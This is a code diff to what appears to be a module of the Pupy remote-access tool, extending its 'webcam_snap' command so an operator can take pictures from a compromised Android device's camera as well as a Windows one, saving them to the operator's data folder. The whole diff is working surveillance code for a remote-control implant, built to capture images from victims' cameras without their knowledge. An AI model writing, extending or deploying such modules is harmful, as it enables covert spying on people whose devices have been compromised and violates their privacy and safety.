@@ -36,12 +36,9 @@ def pil_save(filename, pixels, width, height):
 	img.save(filename, quality=95, optimize=True, progressive=True)
 	logging.info('webcam snap saved to %s'%filename)
 
-
+@compatibility("windows", "android")
 class WebcamSnapModule(PupyModule):
 	""" take a webcam snap :) """
-	@windows_only
-	def is_compatible(self):
-		pass
 
 	def init_argparse(self):
 		self.arg_parser = PupyArgumentParser(prog='webcam_snap', description=self.__doc__)
@@ -53,14 +50,20 @@ class WebcamSnapModule(PupyModule):
 			os.makedirs(os.path.join("data","webcam_snaps"))
 		except Exception:
 			pass
-		self.client.load_package("vidcap")
 		filepath=os.path.join("data","webcam_snaps","snap_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".jpg")
-		dev=self.client.conn.modules['vidcap'].new_Dev(args.device,0)
-		self.info("device %s exists, taking a snap ..."%args.device)
-		buff, width, height = dev.getbuffer()
-		pil_save(filepath, buff, width, height)
+		if self.client.is_windows():
+			self.client.load_package("vidcap")
+			dev=self.client.conn.modules['vidcap'].new_Dev(args.device,0)
+			self.info("device %s exists, taking a snap ..."%args.device)
+			buff, width, height = dev.getbuffer()
+			pil_save(filepath, buff, width, height)
+		elif self.client.is_android():
+			self.client.load_package("pupydroid.camera")
+			data=self.client.conn.modules['pupydroid.camera'].take_picture(args.device)
+			with open(filepath,"w") as f:
+				f.write(data)
 		if args.view:
 			subprocess.Popen(["eog",filepath])
-		self.success("webcam snap saved to %s"%filepath)
+		self.success("webcam picture saved to %s"%filepath)
 
 
